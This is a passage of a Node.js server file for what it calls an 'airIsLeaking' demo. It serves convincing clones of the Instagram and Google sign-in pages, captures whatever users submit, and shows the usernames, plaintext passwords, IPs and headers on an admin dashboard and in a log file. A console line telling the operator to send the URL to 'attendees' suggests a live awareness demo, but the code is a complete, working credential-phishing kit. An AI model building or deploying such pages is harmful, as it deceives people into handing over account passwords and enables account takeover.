  const userEl = document.getElementById('ig-user');
  const passEl = document.getElementById('ig-pass');
  const submitEl = document.getElementById('ig-submit');
  function updateBtn() {
    submitEl.disabled = !(userEl.value.trim() && passEl.value);
  }
  userEl.addEventListener('input', updateBtn);
  passEl.addEventListener('input', updateBtn);
  updateBtn();
</script>
</body>
</html>`);
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: POST /instagram-submit  — capture → redirect to chat
// ════════════════════════════════════════════════════════════════════════════
app.post('/instagram-submit', (req, res) => {
  const username = String(req.body?.username ?? '').trim();
  capture(req, 'instagram-clone');
  res.redirect('/chat?user=' + encodeURIComponent(username || 'user'));
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /google  — Google sign-in clone
// ════════════════════════════════════════════════════════════════════════════
app.get('/google', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    background: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 24px;
    color: #202124;
  }
  .g-card {
    width: 100%; max-width: 450px;
    border: 1px solid #dadce0;
    border-radius: 8px;
    padding: 48px 40px 36px;
  }
  .g-logo { text-align: center; margin-bottom: 20px; }
  .g-logo svg { width: 75px; height: 24px; }
  .g-title { font-size: 1.375rem; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
  .g-sub { font-size: 1rem; text-align: center; color: #202124; margin-bottom: 32px; }
  .g-email-hint {
    display: inline-block; margin: 0 auto 28px;
    padding: 4px 14px 4px 8px;
    border: 1px solid #dadce0; border-radius: 20px;
    font-size: 0.875rem; color: #202124;
    display: flex; align-items: center; gap: 8px; width: fit-content; margin: 0 auto 28px;
  }
  .g-email-hint .av {
    width: 28px; height: 28px; border-radius: 50%;
    background: #1a73e8; color: #fff;
    display: flex; align-items: center; justify-content: center;
    font-size: 0.8rem; font-weight: 500; flex-shrink: 0;
  }
  /* Input */
  .g-field { position: relative; margin-bottom: 28px; }
  .g-field input {
    width: 100%; padding: 14px 12px 14px;
    border: 1px solid #747775; border-radius: 4px;
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    font-size: 1rem; color: #202124;
    outline: none;
    transition: border-color .15s, box-shadow .15s;
    background: #fff;
  }
  .g-field input:focus { border-color: #1a73e8; border-width: 2px; box-shadow: none; padding: 13px 11px 13px; }
  .g-field label {
    position: absolute; left: 12px; top: -9px;
    background: #fff; padding: 0 4px;
    font-size: 0.75rem; color: #1a73e8;
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
  }
  .g-field input[type=password] { padding-right: 48px; }
  .g-show {
    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
    background: none; border: none; cursor: pointer;
    color: #444746; font-size: 0.8rem; font-family: 'Google Sans', Roboto, Arial, sans-serif;
    font-weight: 500;
  }
  /* Forgot password */
  .g-forgot { font-size: 0.875rem; color: #1a73e8; font-weight: 500; text-decoration: none; display: inline-block; margin-bottom: 28px; }
  .g-forgot:hover { text-decoration: underline; }
  /* Buttons row */
  .g-actions { display: flex; align-items: center; justify-content: space-between; margin-top: 8px; }
  .g-create { color: #1a73e8; font-size: 0.875rem; font-weight: 500; text-decoration: none; }
  .g-create:hover { text-decoration: underline; }
  .g-next {
    background: #1a73e8; color: #fff;
    border: none; border-radius: 4px;
    padding: 10px 28px;
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    font-size: 0.875rem; font-weight: 500;
    cursor: pointer;
    transition: background .15s, box-shadow .15s;
    box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px rgba(60,64,67,0.15);
  }
  .g-next:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 2px 6px rgba(60,64,67,0.15); }
  .g-next:disabled { background: #94a3b8; cursor: not-allowed; box-shadow: none; }
  /* Footer */
  .g-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 12px; padding: 0 8px; }
  .g-footer select {
    border: none; background: none; font-size: 0.75rem; color: #444746;
    font-family: 'Google Sans', Roboto, Arial, sans-serif; cursor: pointer;
  }
  .g-footer-links { display: flex; gap: 14px; }
  .g-footer-links a { font-size: 0.75rem; color: #444746; text-decoration: none; }
  .g-footer-links a:hover { text-decoration: underline; }
  .g-divider { height: 1px; background: #e8eaed; margin: 24px -40px 16px; }

  @media (max-width: 540px) {
    body { padding: 0; justify-content: flex-start; }
    .g-card {
      border: none; border-radius: 0;
      padding: 40px 24px 32px;
      min-height: 100vh;
    }
    /* Fix negative margins that overflow on small screens */
    .g-divider { margin-left: -24px; margin-right: -24px; }
    .g-field input { font-size: 1rem; padding: 16px 12px; min-height: 52px; }
    .g-field input:focus { padding: 15px 11px; }
    .g-field { margin-bottom: 24px; }
    .g-footer { flex-direction: column; gap: 10px; align-items: flex-start; padding: 0; }
    .g-next { padding: 10px 24px; }
  }
</style>
</head>
<body>
<div class="g-card">
  <!-- Google logo SVG -->
  <div class="g-logo">
    <svg viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M31.66 12.2c0-.64-.06-1.25-.16-1.84H24.1v3.48h4.24c-.18.98-.73 1.81-1.56 2.37v1.97h2.52c1.47-1.36 2.32-3.36 2.32-5.98z" fill="#4285F4"/>
      <path d="M24.1 20c2.12 0 3.9-.7 5.2-1.9l-2.52-1.97c-.7.47-1.6.75-2.68.75-2.06 0-3.8-1.39-4.43-3.26H17.1v2.03C18.38 18.22 21.04 20 24.1 20z" fill="#34A853"/>
      <path d="M19.67 13.62a4.8 4.8 0 0 1-.25-1.52c0-.53.09-1.04.25-1.52V8.55H17.1A7.93 7.93 0 0 0 16.26 12c0 1.28.31 2.5.84 3.58l2.57-1.96z" fill="#FBBC05"/>
      <path d="M24.1 7.58c1.16 0 2.2.4 3.02 1.18l2.26-2.26C28 5.24 26.22 4.5 24.1 4.5c-3.06 0-5.72 1.78-7 4.42l2.57 2.03c.63-1.87 2.37-3.37 4.43-3.37z" fill="#EA4335"/>
      <text x="33" y="17" font-family="Product Sans, Arial" font-size="16" fill="#202124" letter-spacing="-0.2">Google</text>
    </svg>
  </div>

  <h1 class="g-title">Sign in</h1>
  <p class="g-sub">Use your Google Account</p>

  <form method="POST" action="/google-submit" id="gForm">
    <div class="g-field">
      <input type="text" name="username" id="g-user" placeholder="" autocomplete="email" required>
      <label for="g-user">Email or phone</label>
    </div>

    <a href="#" class="g-forgot">Forgot email?</a>

    <div class="g-field">
      <input type="password" name="password" id="g-pass" placeholder="" autocomplete="current-password" required>
      <label for="g-pass">Enter your password</label>
      <button type="button" class="g-show" id="g-show-btn">Show</button>
    </div>

    <div class="g-divider"></div>

    <div class="g-actions">
      <a href="#" class="g-create">Create account</a>
      <button type="submit" class="g-next" id="g-next" disabled>Next</button>
    </div>
  </form>

  <div class="g-divider" style="margin-top:20px"></div>
  <div class="g-footer">
    <select aria-label="Language"><option>English (United States)</option></select>
    <div class="g-footer-links">
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </div>
  </div>
</div>

<script>
  var gu = document.getElementById('g-user');
  var gp = document.getElementById('g-pass');
  var gnxt = document.getElementById('g-next');
  var gshow = document.getElementById('g-show-btn');
  function gcheck() { gnxt.disabled = !(gu.value.trim() && gp.value); }
  gu.addEventListener('input', gcheck);
  gp.addEventListener('input', gcheck);
  gshow.addEventListener('click', function() {
    var show = gp.type === 'password';
    gp.type = show ? 'text' : 'password';
    gshow.textContent = show ? 'Hide' : 'Show';
  });
  document.getElementById('gForm').addEventListener('submit', function() {
    gnxt.textContent = 'Signing in…'; gnxt.disabled = true;
  });
</script>
</body>
</html>`);
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: POST /google-submit
// ════════════════════════════════════════════════════════════════════════════
app.post('/google-submit', (req, res) => {
  const username = String(req.body?.username ?? '').trim();
  capture(req, 'google-clone');
  res.redirect('/chat?user=' + encodeURIComponent(username || 'user'));
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /login  — kept for backward compat, now shows same as /
// ════════════════════════════════════════════════════════════════════════════
app.get('/login', (req, res) => res.redirect('/'));


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: POST /login-submit  — kept for backward compat
// ════════════════════════════════════════════════════════════════════════════
app.post('/login-submit', (req, res) => {
  capture(req, 'legacy-login');
  res.redirect('/chat');
});


// ════════════════════════════════════════════════════════════════════════════
// ADMIN — Login gate
// ════════════════════════════════════════════════════════════════════════════
app.get('/admin', (req, res) => {
  // If already authed, go to dashboard
  const cookies = parseCookies(req);
  if (adminSessions.has(cookies.adminToken)) return res.redirect('/admin/dashboard');

  const err = req.query.err ? '<div class="err">Invalid credentials. Try again.</div>' : '';
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Login — airIsLeaking</title>
<style>
  * { box-sizing:border-box; margin:0; padding:0; }
  body {
    font-family: 'Courier New', monospace;
    background: #10001a;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .card {
    background: #1a0a2e;
    border: 1px solid #4b2e6b;
    border-radius: 10px;
    padding: 40px 36px;
    width: 340px;
    box-shadow: 0 8px 40px rgba(0,0,0,.5);
  }
  h2 { color: #c678dd; font-size: 1.1rem; letter-spacing: 2px; margin-bottom: 6px; }
  .sub { color: #5c4475; font-size: 0.72rem; margin-bottom: 28px; }
  label { display:block; font-size:0.75rem; color:#8b6aaa; margin-bottom:5px; margin-top:14px; }
  input[type=text], input[type=password] {
    width: 100%;
    padding: 10px 13px;
    background: #0d001a;
    border: 1px solid #3d1f5a;
    border-radius: 5px;
    color: #e0d0ff;
    font-family: inherit;
    font-size: 0.9rem;
    outline: none;
    transition: border-color .2s;
  }
  input:focus { border-color: #c678dd; }
  button {
    margin-top: 22px;
    width: 100%;
    padding: 11px;
    background: #c678dd;
    border: none;
    border-radius: 5px;
    color: #10001a;
    font-family: inherit;
    font-size: 0.95rem;
    font-weight: 700;
    cursor: pointer;
    letter-spacing: 1px;
    transition: background .2s;
  }
  button:hover { background: #d491ee; }
  .err {
    background: #3a0a0a;
    border: 1px solid #c0392b;
    border-radius: 5px;
    color: #e74c3c;
    font-size: 0.78rem;
    padding: 9px 12px;
    margin-bottom: 10px;
  }
</style>
</head>
<body>
<div class="card">
  <h2>// ADMIN ACCESS</h2>

  ${err}
  <form method="POST" action="/admin-login">
    <label>Username</label>
    <input type="text" name="username" autocomplete="off" placeholder="admin">
    <label>Password</label>
    <input type="password" name="password" placeholder="••••••••">
    <button type="submit">ENTER →</button>
  </form>
</div>
</body>
</html>`);
});

app.post('/admin-login', (req, res) => {
  const { username, password } = req.body;
  if (username === cfg.ADMIN_USERNAME && password === cfg.ADMIN_PASSWORD) {
    const token = crypto.randomBytes(24).toString('hex');
    adminSessions.add(token);
    res.setHeader('Set-Cookie', `adminToken=${token}; Path=/; HttpOnly`);
    res.redirect('/admin/dashboard');
  } else {
    res.redirect('/admin?err=1');
  }
});

app.get('/admin-logout', (req, res) => {
  const cookies = parseCookies(req);
  adminSessions.delete(cookies.adminToken);
  res.setHeader('Set-Cookie', 'adminToken=; Path=/; Max-Age=0');
  res.redirect('/admin');
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /admin/dashboard  — Captured credentials viewer (auth required)
// ════════════════════════════════════════════════════════════════════════════
app.get('/admin/dashboard', requireAdmin, (req, res) => {
  const rows = capturedCreds.map((e, i) => `
    <tr>
      <td>${i + 1}</td>
      <td class="ts">${esc(e.ts)}</td>
      <td><span class="src src-${esc(e.source)}">${esc(e.source)}</span></td>
      <td><code class="ip">${esc(e.ip)}</code></td>
      <td><strong>${esc(e.username)}</strong></td>
      <td><strong class="pass">${esc(e.password)}</strong></td>
      <td><details><summary>view</summary><pre>${esc(e.rawBody)}</pre></details></td>
      <td><details><summary>view</summary><pre>${esc(e.headers)}</pre></details></td>
    </tr>`).join('');

  const uniqueIPs    = new Set(capturedCreds.map(e => e.ip)).size;
  const instaCounts  = capturedCreds.filter(e => e.source === 'instagram-clone').length;
  const rootCounts   = capturedCreds.filter(e => e.source === 'root-login').length;

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Dashboard — airIsLeaking</title>
<style>
  * { box-sizing:border-box; margin:0; padding:0; }
  body {
    font-family: 'Courier New', monospace;
    background: #0d0015;
    color: #d4b8ff;
    min-height: 100vh;
    padding: 24px 20px;
  }
  .topbar {
    display: flex;
    align-items: baseline;
    justify-content: space-between;
    margin-bottom: 6px;
    flex-wrap: wrap;
    gap: 10px;
  }
  h1 { color: #c678dd; font-size: 1.2rem; letter-spacing: 2px; }
  .sub { color: #5c4475; font-size: 0.72rem; margin-bottom: 22px; }
  .actions { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
  .btn {
    background: #c678dd;
    border: none;
    border-radius: 4px;
    color: #0d0015;
    padding: 6px 16px;
    font-family: inherit;
    font-size: 0.78rem;
    cursor: pointer;
    font-weight: bold;
    text-decoration: none;
    display: inline-block;
    transition: background .2s;
  }
  .btn:hover { background: #d491ee; }
  .btn.secondary {
    background: transparent;
    border: 1px solid #4b2e6b;
    color: #8b6aaa;
  }
  .btn.secondary:hover { border-color: #c678dd; color: #c678dd; }
  .stats { display:flex; gap:14px; margin-bottom:22px; flex-wrap:wrap; }
  .stat {
    background: #1a0a2e;
    border: 1px solid #3d1f5a;
    border-radius: 8px;
    padding: 14px 20px;
    min-width: 130px;
  }
  .stat .num { font-size: 1.8rem; color: #c678dd; font-weight: bold; }
  .stat .lbl { font-size: 0.7rem; color: #5c4475; margin-top: 2px; }
  .tbl-wrap { overflow-x: auto; }
  table { width:100%; border-collapse:collapse; font-size:0.75rem; min-width: 800px; }
  th {
    background: #1a0a2e;
    color: #c678dd;
    padding: 10px 12px;
    text-align: left;
    border-bottom: 2px solid #3d1f5a;
    white-space: nowrap;
  }
  td { padding:8px 12px; border-bottom:1px solid #200a35; vertical-align:top; }
  tr:nth-child(even) td { background: #13002a; }
  tr:hover td { background: #1a0a2e; }
  .ts { font-size: 0.68rem; color: #7a5a9a; white-space: nowrap; }
  code.ip { color: #56b6c2; }
  .pass { color: #e06c75; }
  .src { font-size: 0.68rem; padding: 2px 6px; border-radius: 3px; }
  .src-root-login { background:#1a3a1a; color:#3fb950; }
  .src-instagram-clone { background:#3a1a2a; color:#e06c75; }
  .src-legacy-login { background:#2a2a1a; color:#e3b341; }
  pre {
    background: #060010;
    border: 1px solid #200a35;
    border-radius: 4px;
    padding: 8px;
    max-width: 380px;
    overflow-x: auto;
    white-space: pre-wrap;
    font-size: 0.68rem;
    margin-top: 6px;
    color: #9b8abf;
  }
  details summary { cursor:pointer; color:#61afef; font-size:0.72rem; }
  details summary:hover { text-decoration:underline; }
  .empty { text-align:center; padding:60px 0; color:#3d1f5a; }
  .logpath { margin-top:18px; font-size:0.7rem; color:#3d1f5a; }
  .logpath code { color:#5c4475; }
</style>
</head>
<body>
<div class="topbar">
  <div>
    <h1>// ADMIN DASHBOARD</h1>
  </div>
  <div class="actions">
    <button class="btn" onclick="location.reload()">↻ Refresh</button>
    <a href="/admin-logout" class="btn secondary">Logout</a>
  </div>
</div>


<div class="stats">
  <div class="stat">
    <div class="num">${capturedCreds.length}</div>
    <div class="lbl">credentials captured</div>
  </div>
  <div class="stat">
    <div class="num">${uniqueIPs}</div>
    <div class="lbl">unique IPs</div>
  </div>
  <div class="stat">
    <div class="num">${instaCounts}</div>
    <div class="lbl">via instagram clone</div>
  </div>
  <div class="stat">
    <div class="num">${rootCounts}</div>
    <div class="lbl">via root login</div>
  </div>
  <div class="stat">
    <div class="num">${chatMessages.length}</div>
    <div class="lbl">chat messages</div>
  </div>
</div>

${capturedCreds.length === 0
  ? '<div class="empty">No credentials captured yet.<br>Send someone to <code>/</code> or <code>/instagram</code></div>'
  : `<div class="tbl-wrap"><table>
  <thead><tr>
    <th>#</th><th>Timestamp</th><th>Source</th><th>IP</th>
    <th>Username / Email</th><th>Password (PLAIN)</th><th>Raw Body</th><th>HTTP Headers</th>
  </tr></thead>
  <tbody>${rows}</tbody>
</table></div>`}

<div class="logpath">Persistent log: <code>captured.log</code> (next to server.js)</div>
</body>
</html>`);
});


// ════════════════════════════════════════════════════════════════════════════
// ── Start server
// ════════════════════════════════════════════════════════════════════════════
app.listen(PORT, '0.0.0.0', () => {
  const ip = getLanIP();
  console.log('');
  console.log('╔══════════════════════════════════════════════════════╗');
  console.log('║         airIsLeaking — Demo Server Ready             ║');
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log(`║  LAN  ➜  http://${ip.padEnd(15)}:${PORT}             ║`);
  console.log(`║  Local➜  http://127.0.0.1:${PORT}                     ║`);
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log('║  /              → SecurePortal login                 ║');
  console.log('║  /instagram     → Instagram-style clone              ║');
  console.log('║  /google        → Google sign-in clone               ║');
  console.log('║  /chat          → LAN group chat                     ║');
  console.log('║  /admin         → Admin login                        ║');
  console.log('║  /admin/dashboard → Captured data (auth required)    ║');
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log(`║  Admin user: ${cfg.ADMIN_USERNAME.padEnd(38)}║`);
  console.log(`║  Admin pass: ${cfg.ADMIN_PASSWORD.padEnd(38)}║`);
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log('║  Log file:  captured.log                             ║');
  console.log('╚══════════════════════════════════════════════════════╝');
  console.log('');
  console.log(`  ➜ Tell attendees:  http://${ip}:${PORT}`);
  console.log('');
});
